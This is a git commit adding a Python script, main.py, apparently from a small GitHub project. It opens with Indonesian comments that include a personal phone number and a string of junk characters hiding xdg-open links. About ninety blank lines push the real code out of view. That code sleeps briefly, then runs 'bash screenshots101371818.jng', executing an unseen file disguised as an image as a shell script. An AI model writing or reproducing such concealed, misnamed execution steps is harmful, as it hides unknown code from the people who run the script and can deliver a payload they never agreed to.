c26febe061a6f7a791d89a713ad4f9bdb54d0db7
Fhans Moby <79772837+Fhans-moby@users.noreply.github.com>
2021-02-28 11:50:52 +0700

    Add files via upload

---
+++ main.py
@@ -0,0 +1,100 @@
+#HAYO MAU RECODE YAH?:V AWOAKWOAKWOK
+#IZIN YANG PUNYA DULU:V Wanya 081393668101:v 
+#SALIN KODENYA KLO LU BISA AWOKAWOKAWOK
+
+#101029383928749384758283648283748282747483827484938422998%i7f7f7y8uti86i8t6%%%%%fft67888i9o9ouuuy5'MODE'5-#+$+
+#Y78$+$+$+9YI864829PYTHON2557%6%7%8$9728%8739474948%3945483&383%328%283538373733%384683737363%38363%3383%%3383&3%372"XDG-OPEN HTTPS://FHANS-MOBY.BLOGSPOT.COM
+#6384833%283%338&"xdg-open https://github.com/Fhans-Moby"58%%%%#%#%#%%#%u0date={data.python}=False:
+#RULES : NO RECODE ANJING
+import os
+import sys
+import time
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+time.sleep (10.0 / 100)
+os.system ('bash screenshots101371818.jng')
